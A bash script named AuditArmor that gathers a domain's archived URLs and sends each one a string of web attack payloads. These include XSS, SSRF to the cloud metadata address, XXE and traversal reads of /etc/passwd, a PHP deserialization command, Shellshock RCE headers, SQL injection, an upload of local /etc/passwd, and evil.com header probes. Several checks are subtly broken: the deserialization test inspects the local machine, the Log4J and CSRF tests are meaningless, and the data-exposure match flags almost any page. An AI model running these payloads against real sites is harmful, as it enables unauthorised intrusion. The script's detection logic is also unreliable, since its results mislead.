#!/bin/bash

# Original script setup
echo ""

# Define the color
GREEN='\033[0;32m'
# Reset color
NC='\033[0m' 

# Print the text with the green color
echo -e "${GREEN} ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░░▒▓██████████████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░  "
echo -e "${GREEN}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ "
echo -e "${GREEN} ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ "
echo -e "${GREEN}░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  "
echo -e "${GREEN}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ "
echo -e "${GREEN}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ "
echo -e "${GREEN}░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ "
echo -e "${GREEN}                                                                                                                                    "
echo -e "${GREEN}                                                                                                                                    ${NC}"

wget -q --spider https://google.com
if [ $? -ne 0 ]; then
    echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING AuditArmor !"
    exit 1
fi
tput bold;echo "++++ CONNECTION FOUND, LET'S GO!" 

# Install Dependencies for Kali
echo "Installing Dependencies for Kali Linux Only, you must install manually for other OS..." 

# Title and installation for fortune-mod
echo "Installing fortune-mod..."
apt-get install -y fortune-mod > /dev/null 2>&1

# Title and installation for curl
echo "Installing curl..."
apt-get install -y curl > /dev/null 2>&1

# Title and installation for figlet
echo "Installing figlet..." 
apt-get install -y figlet > /dev/null 2>&1

# Title and installation for toilet
echo "Installing toilet..."
apt-get install -y toilet > /dev/null 2>&1

# Title and installation for waybackurls (requires Go)
echo "Installing waybackurls..."
if ! command -v waybackurls &> /dev/null; then
    apt-get install -y golang-go > /dev/null 2>&1
    export GOPATH=$HOME/go
    export PATH=$PATH:$GOPATH/bin
    go install github.com/tomnomnom/waybackurls@latest
fi

echo "Finished Installing: Fortune-mod, curl, figlet, toilet, and waybackurls. Make sure to install manually if necessary!"

echo ""
# Input the domain
echo "Enter the domain: (example.com) "
read domain

# Your original script follows...

if [ -d "$domain" ]; then
  rm -rf "$domain" && mkdir "$domain"
else
  mkdir "$domain"
fi

# Generate URL list using waybackurls
waybackurls "$domain" | grep -E ".js$|.php$|.yml$|.env$|.txt$|.xml$|.config$" > urls.txt

# Ensure the file exists and is not empty
touch "$domain".txt

while read -r url; do
    echo "Processing $url"
    httpx -v "$url" 2>/dev/null | grep -E 'HTTP/1.[01] [0-9]{3}' | awk '{print $2}' | while read -r status_code; do
        if [[ "$status_code" == "200" ]]; then
            echo "$url" >> "$domain.txt"
        fi
    done
done < urls.txt

if [ ! -s "$domain.txt" ]; then
    echo "No valid URLs found. Exiting."
    exit 1
fi

sort -u "$domain.txt" | tee "urls.txt"

count=$(wc -l < "urls.txt")
echo "Total URLs found: $count"
echo -e "----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
# Define the color
ORANGE='\033[0;33m'
# Reset color
NC='\033[0m' 

# Print the text with the orange color
echo -e "${ORANGE}  _          _   _       _    _            _   "
echo -e "${ORANGE} | |        | | ( )     | |  | |          | |  "
echo -e "${ORANGE} | |     ___| |_|/ ___  | |__| |_   _ _ __| |_ "
echo -e "${ORANGE} | |    / _ \ __| / __| |  __  | | | | '__| __|"
echo -e "${ORANGE} | |___|  __/ |_  \__ \ | |  | | |_| | |  | |_ "
echo -e "${ORANGE}   |______\___|\__| |___/ |_|  |_|\__,_|_|   \__|"
echo -e "${ORANGE}                                               "
echo -e "${ORANGE}                                               ${NC}"
echo -e "-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
echo"Scanning Start  !!!!!!"

# Start the attacks
while read url
do

# Check for XSS (Cross-site scripting) vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for XSS vulnerability...\e[0m"
response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d "<script>alert('XSS Vulnerability');</script>" "$url")
if [[ $response == *"<script>alert('XSS Vulnerability');</script>"* ]]; then
  echo -e "$url is XSS \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not XSS \e[31mvulnerable\e[0m"
fi

# Check for SSRF (Server-side request forgery) vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for SSRF vulnerability...\e[0m"
response=$(curl -s -H 'User-Agent: Mozilla/5.0' "$url?url=http://169.254.169.254/")
if [[ $response == *"169.254.169.254"* ]]; then
  echo -e "$url is SSRF \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not SSRF \e[31mvulnerable\e[0m"
fi

# Check for XXE (XML external entity) vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for XXE vulnerability...\e[0m"
response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "$url")
if [[ $response == *"root:x"* ]]; then
  echo -e "$url is XXE \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not XXE \e[31mvulnerable\e[0m"
fi

# Check for Insecure Deserialization vulnerability:
echo -e "\e[33mTesting \e[0m${url}\e[33m for Insecure Deserialization vulnerability...\e[0m"
response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d 'O:8:"stdClass":1:{s:5:"shell";s:5:"touch /tmp/pwned";}' "$url")
if [[ -f "/tmp/pwned" ]]; then
  echo -e "$url is insecure deserialization \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not insecure deserialization \e[31mvulnerable\e[0m"
fi

# Check for Remote Code Execution via Shellshock vulnerability:
echo -e "\e[33mTesting \e[0m${url}\e[33m for Shellshock vulnerability...\e[0m"
response=$(curl -s -H "User-Agent: () { :; }; /bin/bash -c 'echo vulnerable'" "$url")
if [[ $response == *"vulnerable"* ]]; then
  echo -e "$url is \e[32mvulnerable\e[0m to Shellshock RCE" >> "$domain/$domain.txt"
  # Execute arbitrary command as proof of concept
  echo "Executing arbitrary command as proof of concept..."
  response=$(curl -s -H "User-Agent: () { :; }; /bin/bash -c 'echo SHELLSHOCK_RCE_DEMO'" "$url")
  if [[ $response == *"SHELLSHOCK_RCE_DEMO"* ]]; then
    echo "Successful RCE via Shellshock vulnerability"
  else
    echo "Failed to execute arbitrary command"
  fi
else
  echo -e "$url is not \e[31mvulnerable\e[0m to Shellshock RCE" 
fi

# Check for RCE vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for RCE vulnerability...\e[0m"
response=$(curl -s -H 'User-Agent: () { :;}; echo vulnerable' "$url")
if [[ $response == *"vulnerable"* ]]; then
  echo -e "$url is RCE \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not RCE \e[31mvulnerable\e[0m"
fi

# Check for CSRF vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for CSRF vulnerability...\e[0m"
response=$(curl -s -X POST -d 'token=test' "$url")
if [[ $response == *"token=test"* ]]; then
  echo -e "$url is CSRF \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not CSRF \e[31mvulnerable\e[0m"
fi

# Check for LFI vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for LFI vulnerability...\e[0m"
response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
if [[ $response == *"root:"* ]]; then
  echo -e "$url is LFI \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not LFI \e[31mvulnerable\e[0m"
fi

# Check for open redirect vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for Open Redirect vulnerability...\e[0m"
response=$(curl -s -L "$url?redirect=http://google.com")
if [[ $response == *"<title>Google</title>"* ]]; then
  echo -e "$url is open redirect \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not open redirect \e[31mvulnerable\e[0m"
fi

# Check for Log4J vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for Log4J vulnerability...\e[0m"
response=$(curl -s "$url/%20%20%20%20%20%20%20%20@org.apache.log4j.BasicConfigurator@configure()")
if [[ $response == *"log4j"* ]]; then
  echo -e "$url is Log4J \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not Log4J \e[31mvulnerable\e[0m"
fi

# Check for RFI vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for RFI vulnerability...\e[0m"
response=$(curl -s "$url?file=http://google.com")
if [[ $response == *"<title>Google</title>"* ]]; then
  echo -e "$url is RFI \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not RFI \e[31mvulnerable\e[0m"
fi

# Check for directory traversal vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for path/directory traversal vulnerability...\e[0m"
response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
if [[ $response == *"root:"* ]]; then
  echo -e "$url is path traversal \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not path traversal \e[31mvulnerable\e[0m"
fi

# Check for SQL injection vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for SQL injection vulnerability...\e[0m"
response=$(curl -s "$url/index.php?id=1'")
if [[ $response == *"SQL syntax"* ]]; then
  echo -e "$url is SQL injection \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not SQL injection \e[31mvulnerable\e[0m"
fi

# Check for File Upload vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for File Upload vulnerability...\e[0m"
response=$(curl -s -F "file=@/etc/passwd" "$url/upload")
if [[ $response == *"root:x"* ]]; then
  echo -e "$url is File Upload \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not File Upload \e[31mvulnerable\e[0m"
fi

# Check for Command Injection vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for Command Injection vulnerability...\e[0m"
response=$(curl -s -d "cmd=whoami" "$url/cmd")
if [[ $response == *"root"* ]]; then
  echo -e "$url is Command Injection \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not Command Injection \e[31mvulnerable\e[0m"
fi

# Check for Host Header Injection vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for Host Header Injection vulnerability...\e[0m"
response=$(curl -s -H 'Host: evil.com' "$url")
if [[ $response == *"evil.com"* ]]; then
  echo -e "$url is Host Header Injection \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not Host Header Injection \e[31mvulnerable\e[0m"
fi

# Check for HTTP Parameter Pollution (HPP) vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for HTTP Parameter Pollution vulnerability...\e[0m"
response=$(curl -s "$url?page=1&page=2")
if [[ $response == *"page=2"* ]]; then
  echo -e "$url is HTTP Parameter Pollution \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not HTTP Parameter Pollution \e[31mvulnerable\e[0m"
fi

# Check for Clickjacking vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for Clickjacking vulnerability...\e[0m"
response=$(curl -s -I "$url")
if [[ $response != *"X-Frame-Options: DENY"* && $response != *"X-Frame-Options: SAMEORIGIN"* ]]; then
  echo -e "$url is Clickjacking \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not Clickjacking \e[31mvulnerable\e[0m"
fi

# Check for CORS Misconfiguration vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for CORS Misconfiguration vulnerability...\e[0m"
response=$(curl -s -H "Origin: http://evil.com" -I "$url")
if [[ $response == *"Access-Control-Allow-Origin: http://evil.com"* ]]; then
  echo -e "$url is CORS Misconfiguration \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not CORS Misconfiguration \e[31mvulnerable\e[0m"
fi

# Check for Sensitive Data Exposure vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for Sensitive Data Exposure vulnerability...\e[0m"
response=$(curl -s "$url")
if [[ $response == *"API_KEY"* || $response == *"password"* || $response == *"api"* || $response == *"uri"* || $response == *"login"* ]]; then
  echo -e "$url is Sensitive Data Exposure \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not Sensitive Data Exposure \e[31mvulnerable\e[0m"
fi

# Check for Session Fixation vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for Session Fixation vulnerability...\e[0m"
response=$(curl -s -I "$url")
if [[ $response == *"Set-Cookie: sessionid=12345"* ]]; then
  echo -e "$url is Session Fixation \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not Session Fixation \e[31mvulnerable\e[0m"
fi

done < urls.txt

# Generate report
report_file="$domain/report.txt"
echo "Generating report..."
echo "Vulnerability Report for $domain" > "$report_file"
echo "==================================" >> "$report_file"
echo "" >> "$report_file"

total_tests=$(grep -E "\[32m" "$domain/$domain.txt" | wc -l)
echo "Total Vulnerabilities Found: $total_tests" >> "$report_file"

echo "" >> "$report_file"
echo "Details:" >> "$report_file"
cat "$domain/$domain.txt" >> "$report_file"

echo "Report generated: $report_file"


mv urls.txt $domain
echo "Scanning hash be completed!!... I'll be back!"
